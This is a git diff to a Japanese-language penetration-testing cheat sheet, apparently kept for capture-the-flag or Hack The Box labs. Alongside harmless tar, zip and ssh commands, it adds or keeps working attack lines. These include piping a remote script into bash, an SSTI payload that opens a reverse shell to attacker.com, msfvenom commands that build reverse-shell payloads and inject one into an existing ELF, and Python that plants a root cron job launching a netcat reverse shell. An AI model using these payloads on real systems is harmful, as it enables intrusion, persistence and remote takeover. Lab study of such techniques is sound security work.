@@ -1,5 +1,9 @@
 <!-- MarkdownTOC -->
 
+- ファイルの解凍
+- curl
+- DNS
+- ssh
 - SSTI \(Server-Side Template Injection\)
 - port scan
 - kubeletctl
@@ -40,6 +44,57 @@
 - 
 
 <!-- /MarkdownTOC -->
+
+# ファイルの解凍
+```shell
+# 圧縮
+tar -zcvf xxxx.tar.gz directory
+tar -jcvf xxxx.tar.bz2 directory
+tar -Jcvf xxxx.tar.xz directory
+tar -cvf xxxx.tar directory
+zip -r xxxx.zip directory
+
+# 解凍
+tar -zxvf xxxx.tar.gz
+tar -jxvf xxxx.tar.bz2
+tar -Jxvf xxxx.tar.xz
+tar -xvf xxxx.tar
+unzip xxxx.zip
+```
+
+
+# curl
+```shell
+curl http://10.10.16.17/LinEnum.sh | bash
+```
+# DNS
+```shell
+nslookup 10.10.10.13 10.10.10.13(DNS Server addr)
+# 13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
+
+dig axfr @10.10.10.13 cronos.htb
+# ; <<>> DiG 9.19.21-1-Debian <<>> axfr @10.10.10.13 cronos.htb
+# ; (1 server found)
+# ;; global options: +cmd
+# cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+# cronos.htb.		604800	IN	NS	ns1.cronos.htb.
+# cronos.htb.		604800	IN	A	10.10.10.13
+# admin.cronos.htb.	604800	IN	A	10.10.10.13
+# ns1.cronos.htb.		604800	IN	A	10.10.10.13
+# www.cronos.htb.		604800	IN	A	10.10.10.13
+# cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+# ;; Query time: 776 msec
+# ;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
+# ;; WHEN: Sat Jun 01 18:56:18 JST 2024
+# ;; XFR size: 7 records (messages 1, bytes 203)
+
+```
+
+# ssh
+```shell
+ssh root@10.10.10.7 -oKexAlgorithms=diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa
+```
+
 # SSTI (Server-Side Template Injection)
 ```shell
 {{config.__class__.__init__.__globals__['os'].popen('/bin/bash -c "bash -i >& /dev/tcp/attacker.com/8080 0>&1"').read()}}
@@ -56,7 +111,7 @@ for PORT in {0..65536}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/
 
 # kubeletctl
 ```shell
-
+ 
 # Podの列挙
 kubeletctl --server 10.10.11.133 pods
 
@@ -267,6 +322,8 @@ smb: \> mget *
 ```shell
 msfvenom -p linux/x64/shell_reverse_tcp lhost=10.8.109.203 lport=1234 -f elf -o exploit.elf
 msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.109.203 lport=1234 -f sh -o exploit.sh
+msfvenom -x <existing-elf-file> -p linux/x86/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<your-port> -f elf -o injected.elf
+
 ```
 
 # impacket
@@ -411,6 +468,14 @@ hashcat -m 1400 -a 3 hash.txt
 # python
 ```shell
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+shell = '''
+ *  *  *  *  * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 1235 >/tmp/f
+'''
+f=open('file_to_path', 'a')
+f.write(shell)
+f.close()
+
 ```
 
 # bash
